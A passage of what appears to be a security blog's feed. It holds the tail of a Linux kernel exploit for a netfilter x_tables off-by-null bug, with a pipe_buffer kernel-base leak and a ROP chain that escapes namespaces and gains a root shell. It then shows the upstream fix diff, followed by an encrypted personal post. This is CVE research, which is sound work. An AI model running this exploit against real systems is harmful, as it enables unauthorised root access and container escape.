class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    <span class="comment">// switch to namespace init_nsproxy</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = <span class="number">1</span>;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + FIND_TASK_BY_VPID;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + PUSH_RAX_POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RSI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_PROXY;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWITCH_TASK_NAMESPACES;</span><br><span class="line">    <span class="comment">// gain root privilege and return to userspace</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">这个 commit</a> 中完成了对该漏洞的修复，主要就是<strong>取消掉对 pad 置 0 的这一操作</strong>，而是选择在 <code>translate_compat_table()</code> 中进行预先的置 0，从而避免了为了将 pad 区域置 0 而导致的堆上 off-by-null，笔者个人认为这个方案还算是比较成功的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="comment">index 6c26533480dd1..d6d45d820d79a 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="meta">@@ -1193,6 +1193,8 @@</span> static int translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_ARP_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="comment">index f15bc21d73016..f77ea0dbe6562 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="meta">@@ -1428,6 +1428,8 @@</span> translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="comment">index 2e2119bfcf137..eb2b5404806c6 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="meta">@@ -1443,6 +1443,8 @@</span> translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="comment">index 6bd31a7a27fc5..92e9d4ebc5e8d 100644</span></span><br><span class="line"><span class="comment">--- a/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="meta">@@ -733,7 +733,7 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,</span><br><span class="line"> &#123;</span><br><span class="line"> const struct xt_match *match = m-&gt;u.kernel.match;</span><br><span class="line"> struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;</span><br><span class="line"><span class="deletion">-int pad, off = xt_compat_match_offset(match);</span></span><br><span class="line"><span class="addition">+int off = xt_compat_match_offset(match);</span></span><br><span class="line"> u_int16_t msize = cm-&gt;u.user.match_size;</span><br><span class="line"> char name[sizeof(m-&gt;u.user.name)];</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -743,9 +743,6 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,</span><br><span class="line"> match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);</span><br><span class="line"> else</span><br><span class="line"> memcpy(m-&gt;data, cm-&gt;data, msize - sizeof(*cm));</span><br><span class="line"><span class="deletion">-pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span></span><br><span class="line"><span class="deletion">-if (pad &gt; 0)</span></span><br><span class="line"><span class="deletion">-memset(m-&gt;data + match-&gt;matchsize, 0, pad);</span></span><br><span class="line"> </span><br><span class="line"> msize += off;</span><br><span class="line"> m-&gt;u.user.match_size = msize;</span><br><span class="line"><span class="meta">@@ -1116,7 +1113,7 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line"> &#123;</span><br><span class="line"> const struct xt_target *target = t-&gt;u.kernel.target;</span><br><span class="line"> struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;</span><br><span class="line"><span class="deletion">-int pad, off = xt_compat_target_offset(target);</span></span><br><span class="line"><span class="addition">+int off = xt_compat_target_offset(target);</span></span><br><span class="line"> u_int16_t tsize = ct-&gt;u.user.target_size;</span><br><span class="line"> char name[sizeof(t-&gt;u.user.name)];</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -1126,9 +1123,6 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line"> target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line"> else</span><br><span class="line"> memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));</span><br><span class="line"><span class="deletion">-pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span></span><br><span class="line"><span class="deletion">-if (pad &gt; 0)</span></span><br><span class="line"><span class="deletion">-memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span></span><br><span class="line"> </span><br><span class="line"> tsize += off;</span><br><span class="line"> t-&gt;u.user.target_size = tsize;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;del&gt;喷子永远是版本答案&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="容器逃逸" scheme="http://blog.arttnba3.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x03】Shell之外的往事：一桶凉泡面</title>
    <link href="http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/"/>
    <id>http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</id>
    <published>2022-03-17T20:14:40.000Z</published>
    <updated>2022-08-18T17:44:41.489Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="021a53f82f4d0a53a326dbabae58ecbff5caf1dcda21cbc8c2c71e6d35e1c32e">eef143a3a3e51e2ee0b1e9c84de8c53cc91e34a664716adcbae4109613b0f512e4f2191695bdd8ebd253d7aea5fb72fb7441e7a0c717919bf2d685be72be9f75bb229fefdf00a1d50c05f54dbeda18476fada873faa1e8f0c1d3c2642d134e0a72e5a53d997a9032eb55059b45dfb74dba53660fe60ac68b74c2aa55b7ce3c50484d8455ea294d03d5755991cdb4132a5dba9f709d6c439731c890785e495760e97a0f5cf91d9be2870847bab8af5cb042d628a9bee60fd37d9055e0371856feda62e72612729a1820936cc6d2dcbc15197de145db589df683e7ffa92c6120c0edea38d3f6e6b1a11027580f0c233d8217ad1bd07bad12bf0291bde16123b044a5839d34cc384be04d0442fc9f602ace513f3660bc7b28958fbcdc347b83b8e4bcaa472b64eb5b98ac96d15e8f7b0cf6cac705978ae2070a788c06981ad3d2cb860e7dbdef2dcf704a72f141487a58dda00bcc72c7a6070184cb2bfcda276baf56b941d38a3db0a30e54774de12be79d2c7ed1e46ef7bd2c9c2b80af1ccda49baa66c85eef85487154785cde4d4fb3d2b1ee3999c1641722ef19c07541e5e7097c69ca99998d796c5151e63f7d9b8ab5c66946f9301c754cdea3bfab6f94d20b24d5f57010e3003202b51891df9580119ffaed608e0a5cc56621ef8802e884efacd595e4eb5a06b9ffd6cb48fae2cdefd4054a6b829d198e38aa159080ba75783a9e806024d54994b6bd3a5b7536d4b9408dda28a4b75420fba0e4521945e538cabb9a6f7229eeacf32334e1265a849464609d4af9ed4cd748dbb7fa72111d0a056b3bea351dc4544f7f7937a169c8a8d13c1f2664b4d0c084ee77a7c26f37569eea4e226bff7a5daea2f9acdab3efb03c252f539b8ac6820d6ee5f23fcac3544a2b58dbaec0e91e6bbe7054db5a2b473ed4ce14441e0a79c3cc17f6475bd9d1bced6235f4b9983a0f8dc7bca224cad782444363302a9687697c6a1cb298993bf3709988f72cad5417d18879304479c3e3f710e41255a1b3855bac6b5a74451d7189f9ebe8592674b8b631c9a066168999e820a47d8ec45d6c428c7917ce272c67e84d4e880f45255c924f1ec19ae023b9fbe7e51e3f0c0d70a9b19ede74e7e46223f2cb50a47bdee12e6ca2c4036fb67b141a3511adcc785592f6ace64aedd34a126a52364d6c770ba2ea14ac07c3e68b2b45bd77df2de268eee62ae1d29e79d8e9798ebda99c4c70326da1bf430f8ef813851a6fb9c753712160c097e513980eafab10c3e63fc2a748286956ce3f271f2d9f64a02c7edddd34241a92a41810794e8a28ba3be385c9e9a54562e6e22193ad53381ba1512d3c35e3bb5e38ebe89e7c35d65e86209a224b453eb22c4208c6fae5051ec32d5a3331be3163d21fe1c6d787c05316ebffaa5a6bdaf1278aaebceb0dbdcddc85d259386b553c93491dba7bfd182cedaed31b7d3c7b38f104cd2097ea63970d0580e5abe327a6efe0fa40539856c5974ac182f944c7df952e4204cfe1076f46af9d18da06aa8e3be966c4f69e10c12a3eec3935f7301de0708f0bdab19011b138f023cd6b14196a937d583c5b520b8e08c69c6a1dd58188b08250df5f2f21b97828a497ba4085a3d4dbd05266938b4bbcbd4895c8bf335400b757eccbdfc0be8213effcb68a5df107414da1aae7c0c3a2ea93e09fa4414a2d4ca04a51eacf849aa4484d999e43c1e4c7bfa6e8479dca6a6c9cd2a2fd0cb85eb8402a58267b6fae056c4bdf112fd8b80a2db2f647c68237bee2cdd98ddac77f5a49316ed172cd8a6b49214c3bdcf48cace48f43bd5fe68615b5788ca4fcb866596ae601b683ccf17308896bfae3b03623614a7abe3542cd2a381eec948ee60a7d60c673444f7fde3615429376fcb9e7ba9bfad601e8938b74fabe1d1f7769cd9d09f2b92ecb2b2dedb1c65c4a116f231127b295096143fb4c5cba421fb3169720c5a93209e2018366e37b2ef2299af60577e118430cb0aebc1fcebd53ffbc8603e6570c2d74f1fbefbedba21514f1e85910b9087ab0730aab56fd3344b499505fbfde4ca1a58917a92fb687f5f5bb89a3717ceaae2b91bef950e813a219ce23a1b099d55f4d534ca93df6799cba47036f1a2cea6368a095f8152e9832cf97edd6be7392242f044f5aed2a062ece3a87fa48cdae902c0ad3d7395f2bc6998f34616ac6b221c249f38c172380df1c994b08b6e7be4b4b67aafe3e5085e7e13ad3ca9e60761f4b624ce19168dba2fbd0606b04638004044e38a239a1dcf31346230256f2e69d067c25cd0bfe69d3ee95fa8e07a0eec24394b030b8b1cb1affd424a0e217b3a58fc667c33ced6d476fe18cb397d0716af7e316f63e0091aa0f3b61e5c51f7361b3ae312f5b5b4b4e98f42726454a5f3e0f344c7c86f0e96ab2ef2eb9d2047f29581c1aeba2ad3a8f0c6a1b5cc46b4a3132ac48bb2856c441930e14c642cb424262fb0e0217d43950adeafae0983fdd6901599593fbfc0144dbf51ee22d25570c58070273dc1a44daffce60ddb0105f476d2c7ad19e7926b5d55426e57f680a176ca359856e44a0434c02eb53a6506bf3ea8fb34f56cc44b58204c86363175da82b4af652b27c38d42c62d8d91a4076056fbd41811217599b60d0891286be3dc4d35d8c4490a07caaf348c70a10f96d32f5a1d5430bce1c4f9b27098260d62e1170c4235ccf85b44d0953785033722979baad48f267243f924f5b3fe137700cfe7edb97f87875ad00d1ac40e0d22dd776176e6179ef55f807c6910a05ecaab85e62fd39447732d8ef6716168f521149c7155a642b2d70ebd0425c7aa75259f735b4b3a066fbaa360b72b3dfdeef0f90ffacd6a7a73bffd8e09ad591c4351d0fe690090175c20d1678a270c0e836ec795d8e8be48def1ece83606d1d4091f24582f55b171335bcba7472d0f965ce0a2a9ff355cec243b918d08199519de26ada6747ab0f3e7114937b6d85219da1db83d4baf3b20843214360a4aa4e4ae6fbbd870af67383f4b3cf43438005f9cf2aad2d58a02513df3a1e26f073165ced0ea9d21b446659833b4a13713f903c40e78aaf712c8b0d5a7393cc48c61d1cfc995cbdab3b2221d6fbdf66d9e240b0714ec8ed47334bacaeafe75c9371c613b36355ab54e7677f6f60c57111ae371942a407640ed9059e15490cae1471e6ae61feaaf5725c17cbf9cb6b6797a2fe58de81af37936d395383927aa3421c2b11480f7518fe52e9d917e820d3075bd0c890577e0a94813a61fc58aad4954dc4e455be7d8d174d9ddfe1670f8eaffef937ff44083bf4ce896caf1299aabc3358f49a994970b6ae2709feed2bfee682e62592334c06b8bdee852d0fa0e3855d4c0a0b3bbf03ff7b0b79ca63be326051ca0e85297b279447ae51e9781696c5c8b3968c0a5a392dd11f97f5a40cea9016dab58534d848e02e7cc5dd4ca13708345d8fb2b192d149e4b1978cda66f1d13c71136b2aefff0ca7f6f1a9bb3bd8a974c39b8f46b1399688c4964fc293afea1f6dd8aa9fffca897b540b956e2e7b4c7780bd280f1cb075e0997667a7bf6ee0b789c1beaa21df05b2762292a266f5787655d4d6e81cf39ec9175d9805ef2f18f638318ba2f38513d9773edbdbe46da05905a6cd1618e9cfd86d0261434b86549fb32e85a5b0bc3ac7b5bebfa3814f26e50dd1c324f4d586982ef399f698b191980c2847c865b2a99373d845e13ec26ba637469d5c8bb2dc46ec70d798bc6239d61378c26e70e6a559559b61e738d05aafdaf608ee3c4322a1627bad8cffd694ea426a752e20e18ad068e7d0fbfe5cb33b345059c8cf2544ff00f6c679feb77ed0bef4fa1109760e47cd2d0fbe21f3c5240e91a0b1ebb5f60c83549187c5d6ed491aef4dae010d5c5ab5db5480a68896ecce1582e5f401fd1bd425f8056bb2d603fae40064a9c2df1117683da722b2ac0fab4caf97f0ac6eda5c87ebfb69b29c5b7a53ffa255b4206dcefa6f035e25cfcff6d3109d7c936b1c99ddfbfff84d6efcb9022775af383791325a72bdf3c19a4766dcc47ba559cb0ea5aa89f21fe70b3ab1074b5c66e7f7fe7077800c1e8a41d6913f615e3fc0f56b1fd44b7a4ee3f92bc1b41e598507e2c7e2b74763809c3edc892f492346bdc8844dc96191f5a57ecf5c9bf6a0a61cb623a6f827414951d349334d9c3073c95274923563ec80117331e711ebdb97716404b88fb478041aedee0354aed9bcc1572a4d8b9236d0dd7b2ccea3a3e596f8daa496ed850a15d6e9641139fd0a75bfe66fe0a4f39a956a5f324ea820613b3969bc78f60ca15fb066f0589e6f12dfdaebab61aef2f22e8b086f148c504fd3676b6b6b5e8ba81088c044cf93fc21cc16fd19518b64e0787098f93e7cb7ffe1b580563a1b34e280787406b12569149a2f198808ee0d6483ac14031376783e409a192228a6620820742d4c1bd14823fd589eb4fa22b686c0d61efb3685d5488c5a6cefbdde112ad8d0325f1dd00dc3ff5b78fba9f251e7ecd1850813e0a68e14616220042d7fde8aa714034406fe542856f49d53c274cefd7f4637239a339ad9272a31ed93d094b227bc1eeccfee46b270aa61a7968c5b20f80832b2b8f49e6556dc5085ddc14cfc51175dd42314c0d659b81efcab91f1ae0112706f95737eb5d99815e53c920a5e9c8416a1e45d5b24727df42844996f87ebfd4bd2ba719b46fb36e0704454ebf8938f5079e1375b96dc61fca34e7827f53b5a22e5cef2a6203542cfcddfad2dd72e6575512206f53ed434e1171e3ef675bca25e579804ee94468cc0dfa893cbfd767ae872998c3273d296078617f9c27023796f9b9f62bf71ca2b79b004bcf920559ff957b5200a8fb0d2160b1102a5ba3773189959cced97cd94a1e6e6076bf6079c6f9613ba6509095758e82e7d3eba976a41fa4f5d02730d93631f54a88b1a01316dbc69fcc14ca9332418afcea33ad91934a0188cc8eb89749721ef2ab7c2919a80016418c4b753324fe762a6ba7fb18487a5246dc1900737de4cdcd2660eed2c69f313f43e338667eb3a90a087c3698312466aa339596210e75a149a6f92d26501b2071f7e13c88eb1cd0eaac84bd8a44bec27580cde0512cd9ea0119e046d7a25766dff02eb235fd026813b3488430b19baaa747f85e641fedeef54f49415ea9d82c556d26f7ea345fb610d2efe45b5659119a0c9f9e96e2341ccba9c235b1e6de1b074c0b64c9fc6fb5e0d7e72f5dcd187c15002b03e87694e05bd4a5d739c6c5655491a86bb8c7c3ed5b632220589db51d7a4f1ac8c68600a6f99b60dbbb8aa1a2d97bdef479717895f62f3ac28499c5aea3e41c10ce3fe66b5e23020c69d406a7d4ac5ccc66878484f2446dabb3a54e98530dfa1940ec242be18d276e3b04ef540d2343379adeaab00aa81e6a72e7470911026d4b30382e946f729d2c2ae5b45870395d100b8bdd86ff681796569604f6dff38922f5c014b2f4d2c442218dd5ced5200fb8709339c8c49795cd8ba08fc5eebab5685a5636d524c5428b7bd8e2f5bf3e9a246d89095400d46745af6dbc9243ce599bd32200d713da69293d044b46941afd463c8a78396653fab112b4ff82d450148ee74b06e27c4aadf533a54c935618dcc3aae5ef41c84a5a82b648315f118bcfe0840b1df70d82c6b033d8f3d8f0ec8ef41fb60974393c7b3ed57feb9607a3439f99b3f0c0739ab4b28ce77a1b415f601cfe41c85fc3ac8fe997e8dd0acf54596dc62929bc61beb310a5d0c930010a8e2c88c5385b17a0f0ed68c4403d4262c860c590caf539d606d72e19f5f74904c15c4a551fbe205767c8fee753e0cc05bfe64dc6c0aaf6ba2d20f99307ad81009b0b35f63f729045b434266e4154fdd5a3f243e657580306036589b85ef95ac77c5e6f834d0fef9060cc5a2a3a90bba46961e9e16266854dbae23bec56f80e36d544558622c536cf02bf4f36230af85d356fdacb0b349e4542c892b18086744a896db7a3656bdd43ab16c086c60d8a8eb9a60408afa923aea3aec98d4814ff7a28e64a9f6f892e778442842afbdd7b2e2fc771fc5bfec2a7150e90d4047831cac65f5950b25edac2229122cf98d521956c255270322c3a33bc3eac12c4904281d29afddba4d8996cea6bdd586735d5cc0be4b358a1e5e369f8e518d1e19305293d50a18c2b8ece01c89d40a83333843abe3c86ba09df1a446c77d5c5a5e47a0ae2ced39eee35537e71a8c668dc11c8b3c5010bf711b040cee59bf0851848155711fe8a1f3b004654fad25d9b00d7a7dd419a2403e26c1522b7c7c3d3d1ff882f3752dcff157c5bc043fa5c4a868f5a2ac2106b8a568cac7ac13217cff87f08217681fe99417923199ba1b4c547a5396bdd152f7591151d96752aac9fae00631140f260266e55ef86ee647c77fc6e55cc1459e301116cdf0616bc301b6a55dcda5b32fa64db3d628bf4373f51699c9114d3d4ef9cc540d98340c83c18d78974f6d4465aa74e541178b4a8ee067e9e49d3d7ee5e274371952feeba5a23bdaaf90218da50ea22d4ddd7f15e7f4fa33fc37c3fd4679f1bffd22e8b93ed5dc2e1b37e4d7c4cca5502092d908dbba2febcb89c71b44625497d62e793c64b8b1a2a8141540a384a36b5ec0a023e6c5f0f63003c268ab7ed05fd22aa91bcbd0d2301d1d0be47e3afc1c30e379ac48e621e541b9b86f72337a0e7a9adf5ba701f4dcdfd454b7246e9888e7f2b71dd0f48df2954cf182935606e1406ed4d7cc0db0b40127216a0b816c348311340efedb209784e8c592971858ddc4289207157aa95b8b6d2c2a7bf977b6c08c2ac9e30571e1c30ca79ed132d9db65ed246de08829cf2ff8e35a2c5d24a0f421f4784cfff63399b6f284ea6e23591859da56d5905d265223f5c3ac05044d7a035a4685441321f7aa2b2f9297e9c4b24b03c48a5fcca8c001ea95d5b55a610287ba284f28ffc43b898a6f9f06e3185ab67ccd32091bfe7dad47bfd70fba676ee069c9600c4ce3c9fb1492c6e842caa8a042681333381f3d171d79c51f57e4d68aa9e7ee83decf5204f833bd6a56327104c0f09f64f44048eea3d144c927dde9b3b1796df1b624bdfe2033fc14366563ffa23b2b173c2529818e6238ae12e351aeb9fd8f370a7e864037785683cc33a20be757130bb447adb80bbc4ba38854b7d188a984faa7e060c136de7071b6371875e0bb5ae3dd1efe2554d91888d945edfa45f6fd21736781f6fa1eff033635809fce8090accdb57d6efadd4cc274e1fb4daeef2dc0ada75b2fcc7194e16062c5f012d97e8f6251d776faac870606d48e14c2418fa89bbf5aa5933b8d16970955b8f5b0115e5519044ba56643ae822035d2a9fb26eae96d05d5ec638877a41bc49e60e18cf1a599bfef594f9f